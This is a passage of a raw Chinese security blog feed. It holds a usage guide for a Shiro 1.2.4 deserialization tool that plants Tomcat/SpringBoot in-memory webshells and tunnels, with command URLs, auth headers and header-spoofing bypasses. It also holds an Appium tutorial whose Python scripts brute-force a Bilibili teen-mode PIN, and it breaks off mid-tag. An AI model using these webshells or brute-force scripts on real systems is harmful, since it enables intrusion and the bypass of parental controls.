href="http://ip:port/xxx?labCmd=[命令]&amp;pwd=[密码]。">http://ip:port/xxx?labCmd=[命令]&amp;pwd=[密码]。</a></p><p> 3.支持Tomcat7、Tomcat8、Tomcat9下蚁剑内存shell的写入与卸载(请用蚁剑连接，连接类型CUSTOM)。 </p><p>执行成功后连接的URL为<a href="http://ip:port/xxx?ver=[任意字符串]。">http://ip:port/xxx?ver=[任意字符串]。</a></p><p> 4.支持Tomcat7、Tomcat8、Tomcat9下冰蝎内存shell的写入与卸载(请用蚁剑连接，连接类型JSP)。</p><p> 执行成功后连接的URL为<a href="http://ip:port/xxx。">http://ip:port/xxx。</a></p><p>5.新增配置中心，支持自定义UA和x-forwarded-for；新增内存代理Tunnel，新增AES-GCM加密方式的支持，新增一键卸载所有内存SHELL。</p><blockquote><p>以上发送请求时均需带上自定义的header：Accept-Header:[自定义的Accept-Header内容]</p></blockquote><p>下面具体说一下各个功能的使用方法，主要是介绍命令执行的使用方法。</p><h2 id="0x02-使用说明"><a href="#0x02-使用说明" class="headerlink" title="0x02 使用说明"></a>0x02 使用说明</h2><p>一共有三个功能模块，分别是KEY检测、命令执行和配置中心。</p><h3 id="KEY检测"><a href="#KEY检测" class="headerlink" title="KEY检测"></a>KEY检测</h3><p><img src="key%E6%A3%80%E6%B5%8B.png" alt="回显"></p><p>这一部分功能说明可以参考<a href="https://github.com/fupinglee/ShiroScan。" target="_blank" rel="noopener">https://github.com/fupinglee/ShiroScan。</a></p><p><strong>新增AES-GCM加密方式。</strong></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>命令执行中一共有回显、内存shell和卸载这三块。</p><h4 id="回显"><a href="#回显" class="headerlink" title="回显"></a><strong>回显</strong></h4><p>输入正确的key，选择正确的Gadget即可。支持Tomcat6、7、8、9以及SpringBoot下的通用回显。</p><p><img src="01.png" alt="回显"></p><h4 id="内存shell"><a href="#内存shell" class="headerlink" title="内存shell"></a><strong>内存shell</strong></h4><p>这个一共有6个选择，分别是<strong>CMDSHELL</strong>、<strong>EvilObject</strong>、<strong>[蚁剑]蚁剑SHELL</strong>、<strong>[蚁剑]冰蝎SHELL</strong>、<strong>[蚁剑]冰蝎SHELL[SpringBoot]</strong>、<strong>Tunnel</strong>。</p><p>常用的有<strong>CMDSHELL</strong>、<strong>[蚁剑]蚁剑SHELL</strong>、<strong>[蚁剑]冰蝎SHELL</strong>、<strong>[蚁剑]冰蝎SHELL[SpringBoot]</strong>、<strong>Tunnel</strong> 5个，EvilObject在这里只是为了写入蚁剑SHELL和Tunnel而用的，暂时没有单独使用的机会，所以这里就不对其进行功能介绍了。</p><p><img src="25.png" alt="内存shell"></p><blockquote><p>内存Shell都是采用的Filter，因此连接或者使用时，可以使用任意路径，只需配置好指定的Header与密码。</p></blockquote><h5 id="1-CMDSHELL"><a href="#1-CMDSHELL" class="headerlink" title="1.CMDSHELL"></a>1.CMDSHELL</h5><p><img src="03.png" alt="CMDSHELL"></p><p>可以自定义密码和请求头，都是必须的。</p><p>保存完毕后点击开始按钮。</p><p><img src="04.png" alt="CMDshell"></p><p>执行的效果：</p><p><img src="05.png" alt="CMDshell"></p><p>只有在密码、和header都正确且存在的情况下，才会执行命令，否则返回正常的页面。</p><h5 id="2-蚁剑-蚁剑shell"><a href="#2-蚁剑-蚁剑shell" class="headerlink" title="2.[蚁剑]蚁剑shell"></a>2.[蚁剑]蚁剑shell</h5><p><img src="06.png" alt="蚁剑shell"></p><p>输入密码和Header保存后点击开始按钮，会将蚁剑Shell Filter加载进去</p><p><img src="07.png" alt="蚁剑shell"></p><p>使用蚁剑连接</p><p><img src="08.png" alt="蚁剑shell"></p><p>一共有三个需要注意的地方。</p><p>1.URL中需要有ver参数</p><p>2.连接类型为CUSTOM</p><p>3.需要添加Header，Name为Accept-Header，Value是自己设置的值</p><p>这三个都需要且正确，否则会连接不成功。</p><p><img src="09.png" alt="蚁剑shell"></p><h5 id="3-蚁剑-冰蝎shell"><a href="#3-蚁剑-冰蝎shell" class="headerlink" title="3.[蚁剑]冰蝎shell"></a>3.[蚁剑]冰蝎shell</h5><h6 id="a-Tomcat环境下"><a href="#a-Tomcat环境下" class="headerlink" title="a)Tomcat环境下"></a>a)Tomcat环境下</h6><p><img src="10.png" alt="冰蝎shell"></p><p>输入密码和Header保存后点击开始按钮，会将冰蝎Shell Filter加载进去</p><p><img src="11.png" alt="冰蝎shell"></p><p>这里的话需要使用新版的<strong>蚁剑</strong>来连接，冰蝎是无法连接此shell的，所以类型为<code>[蚁剑]冰蝎SHELL</code>。</p><p>不过最新版的蚁剑也是无法连接的，需要自己从<a href="https://github.com/AntSwordProject/antSword" target="_blank" rel="noopener">https://github.com/AntSwordProject/antSword</a> 下载代码，然后覆盖到自己的蚁剑目录才可以，作者已经更新了代码，但是还没有发布，需要自己下载后替换文件即可。</p><p><img src="12.png" alt="冰蝎shell"></p><p><img src="13.png" alt="冰蝎shell"></p><p>连接冰蝎shell也需要注意三点。</p><p>1.需要从github下载代码替换蚁剑客户端</p><p>2.连接类型为JSP</p><p>3.需要添加Header，Name为Accept-Header，Value是自己设置的值</p><p>否则也是无法连接的，这里就不演示了。</p><h6 id="b-SpringBoot环境下"><a href="#b-SpringBoot环境下" class="headerlink" title="b)SpringBoot环境下"></a>b)SpringBoot环境下</h6><p>支持回显与冰蝎shell</p><p><img src="20.png" alt="SpringBoot下回显"></p><p><img src="21.png" alt="Springboot下写入冰蝎内存shell"></p><p>连接时需要利用修改的蚁剑模版</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;fupinglee&#x2F;AntSword-JSP-Template</span><br><span class="line">cd AntSword-JSP-Template</span><br><span class="line">.&#x2F;build.sh</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/AntSwordProject/AntSword-JSP-Template/pull/1" target="_blank" rel="noopener">https://github.com/AntSwordProject/AntSword-JSP-Template/pull/1</a></p></blockquote><p>然后将dist下的文件替换</p><p><code>AntSwordData/antSword-master/source/core/jsp/template</code></p><p>中的文件，然后重启蚁剑客户端。</p><p>修改前连接500错误</p><p><img src="22.png" alt="Springboot下写入冰蝎内存shell"></p><p>修改后正常连接</p><p><img src="23.png" alt="Springboot下写入冰蝎内存shell"></p><p>蚁剑连接</p><p><img src="24.png" alt="Springboot下写入冰蝎内存shell"></p><h5 id="4-Tunnel"><a href="#4-Tunnel" class="headerlink" title="4.Tunnel"></a>4.Tunnel</h5><p>内存代理shell。</p><p><img src="26.png" alt="新增Tunnel内存代理"></p><p>这里就不需要密码了，因此密码框是无法编辑的。</p><p><img src="27.png" alt="新增Tunnel内存代理"></p><blockquote><p>注意这里是Cache-Header</p></blockquote><p><img src="28.png" alt="新增Tunnel内存代理"></p><p>使用原版的reGeorgSocksProxy.py是无法连接的。</p><p><img src="29.png" alt="Tunnel内存代理"></p><p>需要加上自定义的Cache-Header，这里是<code>&quot;Cache-Header&quot;:&quot;thisIsMyJob!@&quot;</code>。</p><p>也可以直接使用<a href="https://github.com/fupinglee/MyPython/blob/master/tools/reGeorgSocksProxy_MMShell.py" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/blob/master/tools/reGeorgSocksProxy_MMShell.py</a> </p><blockquote><p>注意使用时需要替换自己的Cache-Header的值。</p></blockquote><p>修改后运行</p><p><img src="30.png" alt="Tunnel内存代理"></p><h4 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h4><p>卸载的意思就是将Filter移除掉。</p><p>这里用cmdshell为例</p><p><img src="14.png" alt="卸载内存shell"></p><p>选择类型后确定，然后点击开始按钮</p><p><img src="15.png" alt="卸载内存shell"></p><p>cmdshell即被卸载</p><p><img src="16.png" alt="卸载内存shell"></p><p><strong>新增了一键卸载的命令。</strong></p><p><img src="31.png" alt="一键卸载内存shell"></p><p>会一次将所有写入的内存shell都给卸载。</p><h4 id="更新密码"><a href="#更新密码" class="headerlink" title="更新密码"></a>更新密码</h4><p>如何更新shell密码</p><p>仍以cmdshell为例，其他的一样的操作，都是重新加载一次内存shell即可。</p><p>首先加载一个cmdshell</p><p><img src="17.png" alt="修改密码"></p><p>修改密码是选择内存shell，然后选择shell类型，输入密码和自定义的header</p><p><img src="18.png" alt="修改密码"></p><p>修改密码为cmd2,原来的密码已经失效了</p><p><img src="19.png" alt="修改密码"></p><p>新的密码可以执行命令。</p><h3 id="配置中心"><a href="#配置中心" class="headerlink" title="配置中心"></a>配置中心</h3><p><img src="32.png" alt="配置中心"></p><p>配置中心可以使用代理和自定义UA、X-Forwarded-For，保存后立即生效。</p><blockquote><p>在两次实例中遇到了通过修改UA或X-Forwarded-For绕过限制执行命令的情况，因此增加了这个功能。</p></blockquote><h2 id="0x03-其他"><a href="#0x03-其他" class="headerlink" title="0x03 其他"></a>0x03 其他</h2><p><strong>仅供安全人员进行有授权的验证,勿用于非法测试。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 简介&quot;&gt;&lt;/a&gt;0x01 简介&lt;/h2&gt;&lt;p&gt;一款关于Shiro 1.2.4反序列化漏洞利用的回显工具。最新版本为v2.4。&lt;/p&gt;
    
    </summary>
    
    
      <category term="编程开发" scheme="https://fuping.site/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Shiro反序列化回显工具" scheme="https://fuping.site/tags/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%B7%A5%E5%85%B7/"/>
    
      <category term="内存shell" scheme="https://fuping.site/tags/%E5%86%85%E5%AD%98shell/"/>
    
  </entry>
  
  <entry>
    <title>自动化测试工具Appium初探</title>
    <link href="https://fuping.site/2020/05/29/Test-Automation-Using-Appium/"/>
    <id>https://fuping.site/2020/05/29/Test-Automation-Using-Appium/</id>
    <published>2020-05-29T09:21:55.000Z</published>
    <updated>2020-06-25T09:11:10.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>前段时间由于给小破站开启了青少年模式，结果密码给忘记了。导致只能看一些学习课堂和书法之类的相关视频。虽然有找回密码选项，但是找回密码需要发送本人手持身份证的照片。而后在输入密码的时候试了多次，除了提示”密码输入错误，请重试”外，没有其他限制，也没有网络请求。由于是4位的数字密码，我想如果我写个自动输入密码的脚本，利用生成<code>0000</code>~<code>9999</code>的密码字典，应该就可以找到正确的密码。</p><a id="more"></a><p>经搜索发现，IOS自动化的框架有很多，如UIAutomation、XCTest、KIF、APPium等。其中UIAutomation和APPium无需源码就可以进行测试，而且APPium支持多种语言，所以这里我选择了<a href="http://appium.io/" target="_blank" rel="noopener">APPium</a>。</p><h2 id="0x02-环境搭建与自动化测试"><a href="#0x02-环境搭建与自动化测试" class="headerlink" title="0x02 环境搭建与自动化测试"></a>0x02 环境搭建与自动化测试</h2><h3 id="Appium相关介绍"><a href="#Appium相关介绍" class="headerlink" title="Appium相关介绍"></a>Appium相关介绍</h3><p>Appium 是一个开源工具，用于自动化 iOS 手机、 Android 手机和 Windows 桌面平台上的原生、移动 Web 和混合应用。 它使用WebDriver协议驱动iOS，Android和Windows应用程序。Appium 是跨平台的：它允许用同样的 API 对多平台（iOS、Android、Windows）写测试，做到在 iOS、Android 和 Windows 测试套件之间复用代码。而且支持多种语言，java、python、php、Ruby等等。</p><p>我这里是在MacOS系统下进行的测试，采用了手机版本为13.5.1（IOS真机），开发语言选择了Python3.8。</p><p>下面就开始搭建环境进行测试吧。</p><p>首先是APPium的安装。</p><h3 id="APPium相关安装"><a href="#APPium相关安装" class="headerlink" title="APPium相关安装"></a>APPium相关安装</h3><p>如果没有安装Homebrew，则需要先安装<a href="https://brew.sh/" target="_blank" rel="noopener">Homebrew</a>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)</span>"</span></span><br></pre></td></tr></table></figure><p>安装node</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install node</span><br></pre></td></tr></table></figure><p>安装相关依赖与软件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">npm install -g appium <span class="comment"># 安装appium</span></span><br><span class="line">npm install wd</span><br><span class="line">npm install -g appium-doctor</span><br><span class="line">npm i -g mjpeg-consumer</span><br><span class="line">brew install ios-deploy</span><br><span class="line">brew install carthage</span><br><span class="line">brew install lyft/formulae/<span class="built_in">set</span>-simulator-location</span><br><span class="line">npm i -g opencv4nodejs</span><br><span class="line">brew tap facebook/fb</span><br><span class="line">brew install idb-companion</span><br><span class="line">pip install fb-idb</span><br><span class="line">brew tap wix/brew</span><br><span class="line">brew install applesimutils</span><br></pre></td></tr></table></figure><blockquote><p>安装的话根据可以参考<a href="http://appium.io/docs/en/about-appium/getting-started/" target="_blank" rel="noopener">http://appium.io/docs/en/about-appium/getting-started/</a> 进行安装。</p><p>也可以直接安装appium桌面程序<a href="https://github.com/appium/appium-desktop/releases" target="_blank" rel="noopener">https://github.com/appium/appium-desktop/releases</a> 。</p></blockquote><p>安装后执行<code>appium-doctor --ios</code>指令，可以查看与iOS相关配置是否完整。</p><p>如果有哪一项是打叉的，则根据安装说明进行安装就可以了。</p><p><img src="02.png" alt=""></p><p>下图是全部配置都成功的情况。</p><p><img src="01.png" alt=""></p><p>由于需要在真机下进行测试所以还需要配置<a href="https://github.com/facebookarchive/WebDriverAgent" target="_blank" rel="noopener">WebDriverAgent</a>。</p><h3 id="配置WebDriverAgent"><a href="#配置WebDriverAgent" class="headerlink" title="配置WebDriverAgent"></a>配置WebDriverAgent</h3><p>下载<a href="https://github.com/facebookarchive/WebDriverAgent" target="_blank" rel="noopener">WebDriverAgent</a>。</p><p>进入到WebDriverAgent目录，然后执行<code>./Scripts/bootstrap.sh</code>下载安装依赖库。</p><p><img src="03.png" alt=""></p><p>双击<code>WebDriverAgent.xcodeproj</code>使用xcode打开WebDriverAgent项目</p><p>配置<code>WebDriverAgentLib</code>、<code>WebDriverAgentRunner</code>以及<code>IntegrationApp</code>的开发者信息</p><p><img src="04.png" alt=""></p><p>发现有错误，接下来修改<code>WebDriverAgentRunner</code>和<code>IntegrationApp</code>的<code>Bundle identifier</code>。</p><p><img src="05.png" alt="修改WebDriverAgentRunner"></p><p><img src="06.png" alt="修改IntegrationApp"></p><p>修改后发现无报错信息。然后数据线连接真机，进行安装。</p><p>发现编译失败，将 <code>assign</code> 改成 <code>unsafe_unretained</code> ，然后重新使用<code>command + u</code>进行编译安装测试。</p><p><img src="07.png" alt=""></p><p>然后访问<code>http://手机IP:8100</code>。如<a href="http://172.20.10.1:8100/status" target="_blank" rel="noopener">http://172.20.10.1:8100/status</a> 。</p><p><img src="08.png" alt=""></p><blockquote><p>需要手机与电脑处于同一网络下，我这里为了测试，电脑连接的是手机的热点。</p></blockquote><p>此时WebDriverAgent配置成功。如果在Appium中使用时，还需替换Appium中的WebDriverAgent。</p><p>我这里的路径为<code>/Applications/Appium.app/Contents/Resources/app/node_modules/appium/node_modules/appium-xcuitest-driver/node_modules/WebDriverAgent</code></p><p>直接替换即可，或者直接修改Appium中的WebDriverAgent，效果一样。</p><p>接下来就是自动化脚本的编写。</p><h3 id="自动化脚本编写"><a href="#自动化脚本编写" class="headerlink" title="自动化脚本编写"></a>自动化脚本编写</h3><p>可以通过使用Appium应用程序查看IOS元素特征。启动Appium，左上角菜单栏选择<code>APPium</code>-<code>New Session Window...</code>(或者快捷键<code>command+N</code>)。</p><p><img src="09.png" alt=""></p><p>填写对应的启动参数。</p><p>一些必要的参数：</p><ul><li>platformName是测试平台的名称，是ios或者Android。</li><li>udid在ios真机测试时需要，可以通过<code>ios-deploy --list_bundle_id</code>查询</li><li>bundleId需测试程序的bundle id,可以通过<code>ios-deploy --list_bundle_id</code>查询</li></ul><p>配置完成后，点击<code>Start Session</code>，手机会自动打开<code>哔哩哔哩</code>APP。</p><p><img src="10.png" alt=""></p><p>可以利用xpath获取元素并进行输入、点击等一系列操作。接下来就可以通过使用Python脚本来进行自动化测试了。</p><p>需要安装appium的python依赖库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Appium-Python-Client</span><br></pre></td></tr></table></figure><p>启动APP的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> appium <span class="keyword">import</span> webdriver <span class="comment">#pip install Appium-Python-Client</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    desired_caps = dict()</span><br><span class="line">    desired_caps[<span class="string">'platformName'</span>] = <span class="string">'iOS'</span></span><br><span class="line">    desired_caps[<span class="string">'platformVersion'</span>] = <span class="string">'13.5.1'</span></span><br><span class="line">    desired_caps[<span class="string">'deviceName'</span>] = <span class="string">'xiamo6'</span></span><br><span class="line">    desired_caps[<span class="string">'automationName'</span>] = <span class="string">'XCUITest'</span></span><br><span class="line">    desired_caps[<span class="string">'udid'</span>] = <span class="string">'8d4************a3'</span></span><br><span class="line">    desired_caps[<span class="string">'bundleId'</span>] = <span class="string">'tv.danmaku.bilianime'</span></span><br><span class="line">    driver = webdriver.Remote(<span class="string">'http://localhost:4723/wd/hub'</span>, desired_caps)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    driver.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行效果如下：</p><p><img src="11.gif" alt="运行效果"></p><p>接下来需要进入到输入密码界面，依次需要点击<code>我的-青少年模式-修改密码（或者关闭青少年模式）</code>。</p><p>利用脚本实现就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_id(<span class="string">"我的"</span>).click()</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//XCUIElementTypeStaticText[@name=\"青少年模式\"]"</span>).click()</span><br><span class="line">driver.find_element_by_id(<span class="string">"关闭青少年模式"</span>).click()</span><br></pre></td></tr></table></figure><p>运行效果如下</p><p><img src="12.gif" alt="运行效果"></p><blockquote><p>如果是已经打开app 40分钟，或者非正常时段，则直接显示的是输入密码界面。</p></blockquote><p><img src="12.png" alt="运行效果"></p><p>可以利用xpath获取密码输入框元素，输入密码后并点击“立即验证”按钮，主要代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">driver.set_value(driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[1]"</span>),pwd[<span class="number">0</span>])</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[2]"</span>).send_keys(pwd[<span class="number">1</span>])</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[3]"</span>).send_keys(pwd[<span class="number">2</span>])</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[4]"</span>).send_keys(pwd[<span class="number">3</span>])</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//XCUIElementTypeButton[@name=\"立即验证\"]"</span>).click()</span><br></pre></td></tr></table></figure><p>完整的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> appium <span class="keyword">import</span> webdriver <span class="comment">#pip install Appium-Python-Client</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    desired_caps = dict()</span><br><span class="line">    desired_caps[<span class="string">'platformName'</span>] = <span class="string">'iOS'</span></span><br><span class="line">    desired_caps[<span class="string">'platformVersion'</span>] = <span class="string">'13.5.1'</span></span><br><span class="line">    desired_caps[<span class="string">'deviceName'</span>] = <span class="string">'xiamo6'</span></span><br><span class="line">    desired_caps[<span class="string">'automationName'</span>] = <span class="string">'XCUITest'</span></span><br><span class="line">    desired_caps[<span class="string">'udid'</span>] = <span class="string">'8d4904454b********552e976a3'</span></span><br><span class="line">    desired_caps[<span class="string">'bundleId'</span>] = <span class="string">'tv.danmaku.bilianime'</span></span><br><span class="line">    driver = webdriver.Remote(<span class="string">'http://localhost:4723/wd/hub'</span>, desired_caps)</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">5091</span>,<span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwd = str(p)</span><br><span class="line">            driver.set_value(driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[1]"</span>),pwd[<span class="number">0</span>])</span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[2]"</span>).send_keys(pwd[<span class="number">1</span>])</span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[3]"</span>).send_keys(pwd[<span class="number">2</span>])</span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[4]"</span>).send_keys(pwd[<span class="number">3</span>])</span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"//XCUIElementTypeButton[@name=\"立即验证\"]"</span>).click()</span><br><span class="line">            print(pwd,<span class="string">'error'</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            print(pwd,<span class="string">'is right'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">     driver.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行效果</p><p><img src="13.gif" alt="运行效果"></p><p>由上面执行的结果来看，每次输入前都会等待一会再输入，所以看起来速度很慢。</p><p><img src="14.png" alt="运行效果"></p><p>通过找到上图标记的<code>XCUIElementTypeOther</code>，然后使用<code>Send Keys</code>直接传入一个四位数字。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeWindow[1]/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther"</span>).send_keys(pwd)</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//XCUIElementTypeButton[@name=\"下一步\"]"</span>).click()</span><br></pre></td></tr></table></figure><p>执行结果如图所示。</p><p><img src="15.gif" alt="运行效果"></p><blockquote><p>这里的动图是4倍速播放。</p></blockquote><p>修改过后，发现速度确实有所提升，但是总体速度还是很慢的。经过搜索发现，有帖子说在IOS模拟器上和安卓上会快一些，由于程序无法安装到IOS模拟器，所以这里选择了在安卓设备上进行测试。</p><h3 id="安卓环境下测试"><a href="#安卓环境下测试" class="headerlink" title="安卓环境下测试"></a>安卓环境下测试</h3><p>安卓的环境需要安装Android SDK、JDK、安卓模拟器(真机也可以，这里采用的是Genymotion模拟器)。安装后配置<code>JAVA_HOME</code>、<code>ANDROID_HOME</code>。</p><p>然后通过执行<code>appium-doctor --android</code>来查看是否配置成功，如图所示。</p><p><img src="15.png" alt="运行效果"></p><p>查看android元素信息可以使用<code>uiautomatorviewer</code>。位于Android SDK下的<code>/tools/bin/</code>目录。</p><p>启动模拟器并打开测试的APP，然后打开<code>uiautomatorviewer</code>。选择<code>Device Screenshot</code>（从左至右第二个图标）。</p><p><img src="16.png" alt="运行效果"></p><p>通过<code>tv.danmaku.bili:id/et_code</code>可以定位到编辑框，按钮“立即验证”可以通过<code>tv.danmaku.bili:id/operate</code>来定位。</p><p>这里直接贴使用安卓下自动化爆破的脚本，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> appium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    desired_caps = dict()</span><br><span class="line">    desired_caps[<span class="string">'platformName'</span>] = <span class="string">'Android'</span></span><br><span class="line">    desired_caps[<span class="string">'platformVersion'</span>] = <span class="string">'6.0'</span></span><br><span class="line">    desired_caps[<span class="string">'deviceName'</span>] = <span class="string">'Nexus'</span></span><br><span class="line">    desired_caps[<span class="string">'appPackage'</span>] = <span class="string">'tv.danmaku.bili'</span></span><br><span class="line">    desired_caps[<span class="string">'appActivity'</span>] = <span class="string">'ui.splash.SplashActivity'</span></span><br><span class="line">    desired_caps[<span class="string">'noReset'</span>] = <span class="literal">True</span></span><br><span class="line">    desired_caps[<span class="string">'automationName'</span>] = <span class="string">'UiAutomator2'</span></span><br><span class="line"></span><br><span class="line">    driver = webdriver.Remote(<span class="string">'http://localhost:4723/wd/hub'</span>, desired_caps)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pwd <span class="keyword">in</span> range(<span class="number">4011</span>,<span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            driver.find_element_by_id(<span class="string">'tv.danmaku.bili:id/et_code'</span>).send_keys(pwd)</span><br><span class="line">            driver.find_element_by_id(<span class="string">"tv.danmaku.bili:id/operate"</span>).click()</span><br><span class="line">            print(pwd,<span class="string">'error'</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            print(pwd,<span class="string">'is right'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    time.sleep(<span class="number">4</span>)</span><br><span class="line">    driver.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行效果如图所示</p><p><img src="17.gif" alt="运行效果"></p><p>对比之下，在Android下的效率是很快的。而且经过测试，安卓破解100次，耗时约<code>139.14s</code>，而ios破解50次，耗时约<code>262.56s</code>。</p><p>所以最后我采用了安卓环境下进行破解，最终成功跑出了密码。</p><p><img src="18.gif" alt="运行效果"></p><p>已经成功找到密码4578。</p><h2 id="0x03-思考"><a href="#0x03-思考" class="headerlink" title="0x03 思考"></a>0x03 思考</h2><p>由于输入密码的时候并没有发生网络请求，猜测密码应该保存在本地。一般情况下本地存储采用sqlite数据库或者是SharePreferences中。</p><p>先查看SharePreferences中的文件，进入<code>/data/data/tv.danmaku.bili/shared_prefs</code>目录。</p><p><img src="17.png" alt="shared_prefs目录"></p><p>发现文件<code>bili_teenagers_mode_preferences20449166.xml</code>，根据文件名发现文件就是和青少年模式有关的配置文件。查看里面的内容</p><p><img src="18.png" 